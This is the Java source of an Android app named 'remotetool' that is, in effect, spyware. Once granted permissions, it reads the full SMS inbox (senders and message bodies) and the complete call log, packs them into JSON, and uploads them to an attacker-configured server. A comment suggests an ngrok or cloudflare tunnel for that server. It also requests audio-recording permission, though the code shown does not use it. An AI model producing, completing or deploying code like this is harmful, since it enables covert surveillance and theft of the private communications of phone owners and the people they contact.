package com.example.remotetool;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Base64;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int SCREEN_CAPTURE_REQUEST_CODE = 100;
    
    // Apna server URL yahan daalna (jaise ngrok ya cloudflare URL)
    private static final String SERVER_URL = "YOUR_SERVER_URL_HERE/api/upload_logs";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Permissions Check: SMS, Call Logs, Audio
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO
        };

        if (!hasPermissions(permissions)) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            fetchAllLogs();
        }
    }

    private boolean hasPermissions(String[] permissions) {
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void fetchAllLogs() {
        fetchAndSendSMS();
        fetchAndSendCallLogs();
    }

    // 1. SMS Fetching Logic
    private void fetchAndSendSMS() {
        try {
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(uriSms, null, null, null, null);
            JSONArray smsArray = new JSONArray();

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    obj.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    smsArray.put(obj);
                }
                cursor.close();
            }

            JSONObject payload = new JSONObject();
            payload.put("device_id", "TestDevice_01");
            payload.put("type", "sms");
            payload.put("content", smsArray);

            sendDataToServer(payload.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 2. Call Logs Fetching Logic
    private void fetchAndSendCallLogs() {
        try {
            Uri callUri = Uri.parse("content://call_log/calls");
            Cursor cursor = getContentResolver().query(callUri, null, null, null, null);
            JSONArray callArray = new JSONArray();

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    obj.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    obj.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    obj.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    callArray.put(obj);
                }
                cursor.close();
            }

            JSONObject payload = new JSONObject();
            payload.put("device_id", "TestDevice_01");
            payload.put("type", "calls");
            payload.put("content", callArray);

            sendDataToServer(payload.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendDataToServer(String jsonPayload) {
        OkHttpClient client = new OkHttpClient();
        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(jsonPayload, JSON);

        Request request = new Request.Builder()
                .url(SERVER_URL)
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("RemoteTool", "Failed: " + e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d("RemoteTool", "Logs sent successfully!");
                }
            }
        });
    }
}
